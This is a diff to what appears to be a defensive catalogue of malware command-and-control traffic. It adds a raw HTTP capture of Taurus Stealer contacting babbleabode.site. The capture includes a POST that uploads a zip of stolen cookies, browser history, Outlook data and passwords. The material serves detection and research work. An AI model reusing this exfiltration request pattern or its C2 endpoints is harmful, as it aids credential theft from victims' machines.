@@ -3207,6 +3207,97 @@ Host: thankg1.org
 ~~~
 ![alt text](https://github.com/silence-is-best/c2db/blob/master/images/smokeloader.png "Smokeloader")
 
+#### Taurus Stealer
+~~~
+POST /gate/cfg/?post=1&data=r3u6t8u3w8u6t8u3w8 HTTP/1.1
+Content-Type: text/html
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.781.121 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
+Host: babbleabode.site
+Content-Length: 0
+Connection: Keep-Alive
+Cache-Control: no-cache
+
+HTTP/1.1 200 OK
+Date: Wed, 27 May 2020 15:26:32 GMT
+Content-Type: text/plain; charset=utf-8
+Content-Length: 104
+Connection: keep-alive
+Set-Cookie: __cfduid=db7fc43a4ae9bdbfce85e13d77925f5bc1590593192; expires=Fri, 26-Jun-20 15:26:32 GMT; path=/; domain=.babbleabode.site; HttpOnly; SameSite=Lax
+CF-Cache-Status: DYNAMIC
+cf-request-id: 02f85718da0000cc9f0f3c9200000001
+Server: cloudflare
+CF-RAY: 59a0c13af9bdcc9f-WAW
+
+POST /gate/log/?post=2&data=aHlDeEKigDJICBBajI6tSrFLP2LDzW7gS2xM6pajq2spMF6fMYaevU+ESsC8FWE5TVyJrLY+nnYnlX5wTK+s5omkEHIRK0Ik5ZJoPcuo0l3rEAD9K08Hwnjg4gRePOegYXp2GnXBZgalBTZQ6wTYHF+WKMfF3Q== HTTP/1.1
+Cookie: __cfduid=db7fc43a4ae9bdbfce85e13d77925f5bc1590593192
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.781.121 Safari/537.36
+Host: babbleabode.site
+Content-Length: 4353
+Connection: Keep-Alive
+Cache-Control: no-cache
+Content-Type: multipart/form-data; boundary=---------------------------
+
+-----------------------------
+Content-Disposition: form-data; name="file"; filename="r3u6t8u3w8u6t8u3w8.zip"
+Content-Type: application/octet-stream
+
+PK........@{.P................Outlook/UT
+.....^...^...^PK........@{.Po...?...F.......Outlook/Outlook.txtUT
+.....^...^...^s.M...R...K.t(./.K..e..
+H,.../J.......f@.`...+.CK#=C3.=C=C../..PK........@{.P................General/UT
+.....^...^...^PK........@{.P................Cookies/UT
+.....^...^...^PK........@{.P................History/UT
+.....^...^...^PK........@{.P................Cookies/Chrome_0.txtUT
+.....^...^...^..I..@....4?....nF..`.c...6\,.1f5....D..(..EQI...SUEI.N.8...-.l..5qp<..B(......G!
+b.P..%..(....j.....s.c......_..7X	.V..G.9.......;...Y.c...C..5..............q..u...n.....,77..~;....(i..7...kM.i..]6.J/.vlR..Z.m.4N.,....3.......W.....^.!S....}..d..X. .b<.!7a.......;.S..).d......W.?;c9. .8L.....AS.')D~..!i.!.M...e..y ...F	C..a.)...y......!..y..X...K..A....3Ywc9....,.../.K.........^......D.........f0.......y..G..V...]..a.PS..W..../../(E...y(..OB.L.p	<jV....9....[	y..k.C.
+.yS.....+PK........@{.P..+.....s.......Cookies/Mozilla_1.txtUT
+.....^...^...^..Ms.0.@..L~.\I.l......R.B...#..Gb[.d.......N'9to..}..{:..J_.....g..q...`<._..Sj#..d..
+<.V@n....)t
+.N...aYE..9....a7....}....M.~l.5b...E.l&U...a..I;[.....$+4]./.P..).T.[.....<.E....$..0...X
+A..1..8u..S..|...r.....2.9A..).^.....PkS......3...:.	7
+|N..u...W_.	c...`.q.]...b...C.....v..z... .`.X...C0B...9..._.;.H.P0.=.....$....e!_.Z..}.y....f+.~-...J...~..Uq8.K.A..Y.,............
+.O..f}.....L.|.v.0.4.N e!.a.6#.;......<...a9...,.4.a....F.k...L..j...b.dG...4..w..d/..2..M...C.{0+2&.}.F3g..<:..k.H 9*<.G.@......N.ZE....}..PK........B{.P5X.3_...........History/Mozilla_1.txtUT
+.....^...^...^...n.0.E.......D.(......"A.&....)...R.@R..t.....K.$.....Xv)Bs..3.^.^......U#.{_.Q..f..4..R$0v.
+.{u...
+i.!..[..n....,...2.o....5.n..E...j.MY......4.
+Z.w..jj...R...kRg.^I......,.............b.s.U..!l.".V:...R.o......c.. ..t..z]...t........X..'.4.#....p...*.-9^B...2.@.....y@..9a.4.....N?..9.Z.z.~.....'3.....r...
+.L.....7..V1.9.?]..3.....G.{..e....5....
+.SDO.{.....P.....2....'....|.=.......e..,&~2>....G....W...$...9....".i|6e..<.........G.gA.......%.,J....."F)..$M..d..X..l.8.....h..)%....2...5....
+.Y..L...fG......\.Io...6..v.(...s.. .:x
+DZ.....{..^7.."..4$<....& .P.#.1.b....r....Lq. I".s..(....m...|.l...PK........D{.P9.......Z.......Information.txtUT
+.....^...^...^..Io.0........$......4T.3..A...RC.Xu....Q......aNu..-..f..-......+.#.3k.k.;^..E..V.}./...z.L ....W.,g....q.V3.-..Q.|[Q.eW;...M...;.].3W.]k.i..2..O..\.N..../.S.`.e_.0.... 
+^(..A...WP_.-..$..
+8A..rI.A..wt...S.+>1z....|<.A..H...G.tb4.t......(.C...^.....q.a4....xmc.z..FI.K%.1L.1..y....y.!!.....6.#.>V..".r....!.Y.-.-.hIEI
+....+m.b...8.=Lo&.....#...=.T..J..s.[..C.&.....-..%g.....=,+"....
+gr..y...a...d.v.L.PW2....i..J...S.X.&...X..B...........B.v.7.	..`3..9..P.&7..
+`$.n.V.4Cv.E...'s.F...V........Ue.....{a..ZT.........M./...r...:i......{
+..PK........D{.P..
+.s...........General/passwords.txtUT
+.....^...^...^.-..R.())(...///.KKLNM....K.......O......K.t(./.	.r.$......@%
+.\cS3^......."+......T..R0/1%73O....+..ud..._.....i..PK........D{.P....d...:.......Installed Software.txtUT
+.....^...^...^...N.@...1...N.a..B.eE...A1$...]tC....y.......*.d........0..
+.D.>`....@..N.Y.q%.>2Z<.../.... .<....Q..4.+;s.jV.J.S..`\.P.f.23...$...-..
+...%k2^..gd%.6....Lj....y..B.(..G..L..../*.c..M..Y...v...G..D....J..S....V.....G.V....h.+.3.8....=
+.Y.N.....dY(8J...$..4........t3......C..T..=....!.....&.Q.*&.o:.......Q.cR..].v.\..g..l..u.. w..AR...s.;Wmz.yll%....nR
+..PK..........@{.P..............	..........A....Outlook/UT......^PK..........@{.Po...?...F.....	...........7...Outlook/Outlook.txtUT......^PK..........@{.P..............	..........A....General/UT......^PK..........@{.P..............	..........A....Cookies/UT......^PK..........@{.P..............	..........A&...History/UT......^PK..........@{.P..............	...........]...Cookies/Chrome_0.txtUT......^PK..........@{.P..+.....s.....	...............Cookies/Mozilla_1.txtUT......^PK..........B{.P5X.3_.........	...............History/Mozilla_1.txtUT......^PK..........D{.P9.......Z.....	...........o...Information.txtUT......^PK..........D{.P..
+.s.........	............
+..General/passwords.txtUT......^PK..........D{.P....d...:.....	...........~...Installed Software.txtUT......^PK..............'
+....
+-------------------------------
+
+HTTP/1.1 200 OK
+Date: Wed, 27 May 2020 15:26:34 GMT
+Content-Type: text/plain; charset=utf-8
+Content-Length: 0
+Connection: keep-alive
+CF-Cache-Status: DYNAMIC
+cf-request-id: 02f85721270000cc9f0f061200000001
+Server: cloudflare
+CF-RAY: 59a0c1483f4acc9f-WAW
+~~~
+![alt text](https://github.com/silence-is-best/c2db/blob/master/images/taurus.png "Taurus")
+
 #### tRat
 ~~~
 E6B445EAAE293948E31CD2723392863B9AE4D628D2ECD58BFAD8ADEEACEAD19EFEF9868CD7D1872F8C6B8A3AFE498B14D649A09DFEA687D0D2318C13D1EF8FADF9
